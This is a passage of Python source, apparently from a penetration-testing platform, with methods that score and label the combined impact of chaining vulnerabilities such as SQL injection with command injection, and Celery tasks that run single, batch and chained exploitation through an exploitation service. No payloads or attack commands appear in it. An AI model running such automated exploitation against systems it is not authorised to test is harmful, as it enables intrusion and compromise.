                    message=f"Found {len(chain_suggestions)} potential chaining opportunities for {vuln.vulnerability_name}",
                    notification_type="info",
                    metadata={
                        "base_vulnerability_id": str(vuln.id),
                        "chain_suggestions": chain_suggestions
                    }
                )
    
    def _calculate_chain_impact_score(self, vuln1: Vulnerability, vuln2: Vulnerability) -> float:
        """Calculate potential impact score for chaining two vulnerabilities"""
        base_score = 5.0
        
        # Severity multiplier
        severity_scores = {
            VulnSeverity.CRITICAL: 10,
            VulnSeverity.HIGH: 8,
            VulnSeverity.MEDIUM: 6,
            VulnSeverity.LOW: 4,
            VulnSeverity.INFO: 2
        }
        
        score = (severity_scores[vuln1.severity] + severity_scores[vuln2.severity]) / 2
        
        # Type combination bonuses
        type_combinations = {
            ('sqli', 'command_injection'): 3.0,
            ('xss', 'csrf'): 2.5,
            ('file_upload', 'command_injection'): 3.5,
            ('ssrf', 'command_injection'): 3.0,
            ('idor', 'sqli'): 2.0,
        }
        
        vuln1_type = vuln1.vulnerability_type.lower()
        vuln2_type = vuln2.vulnerability_type.lower()
        
        for (type1, type2), bonus in type_combinations.items():
            if (type1 in vuln1_type and type2 in vuln2_type) or \
               (type1 in vuln2_type and type2 in vuln1_type):
                score += bonus
                break
        
        return min(10.0, score)
    
    def _calculate_chain_impact_increase(self, step_number: int, total_steps: int) -> str:
        """Calculate impact increase for chain step"""
        if step_number == 1:
            return "baseline"
        elif step_number <= total_steps / 2:
            return "low"
        elif step_number <= total_steps * 0.75:
            return "medium"
        else:
            return "high"
    
    def _assess_chain_impact(self, vulns: List[Vulnerability], 
                           successful_steps: int, total_steps: int) -> str:
        """Assess the combined impact of a vulnerability chain"""
        if successful_steps == 0:
            return "no_impact"
        
        max_severity = max(v.severity for v in vulns)
        success_rate = successful_steps / total_steps
        vuln_types = [v.vulnerability_type.lower() for v in vulns]
        
        # Determine escalated impact based on combinations
        if success_rate >= 0.8:  # 80% success rate
            if any('command' in vt for vt in vuln_types) and any('sql' in vt for vt in vuln_types):
                return "complete_system_compromise_with_data_access"
            elif any('command' in vt for vt in vuln_types):
                return "system_compromise_achieved"
            elif len(set(vuln_types)) >= 3:
                return "multiple_attack_vectors_chained"
            else:
                return f"elevated_{max_severity.value}_impact"
        elif success_rate >= 0.5:  # 50% success rate
            return f"partial_chain_success_{max_severity.value}"
        else:
            return f"limited_chain_impact_{max_severity.value}"


# Celery task definitions
@shared_task
def exploit_vulnerability_task(vulnerability_id: str):
    """Celery task wrapper for vulnerability exploitation"""
    service = ExploitationService()
    return service.exploit_vulnerability_async(vulnerability_id)


@shared_task
def exploit_vulnerability_batch(vulnerability_ids: List[str]):
    """Celery task for batch vulnerability exploitation"""
    service = ExploitationService()
    results = []
    
    for vuln_id in vulnerability_ids:
        try:
            result = service.exploit_vulnerability_async(vuln_id)
            results.append({"vulnerability_id": vuln_id, "result": result})
        except Exception as e:
            results.append({"vulnerability_id": vuln_id, "error": str(e)})
    
    return results


@shared_task
def create_exploitation_chain_task(vulnerability_ids: List[str], chain_name: str, chain_description: str):
    """Celery task for creating exploitation chains"""
    service = ExploitationService()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        chain_id = loop.run_until_complete(
            service.create_exploitation_chain(vulnerability_ids, chain_name, chain_description)
        )
        return chain_id
    finally:
        loop.close()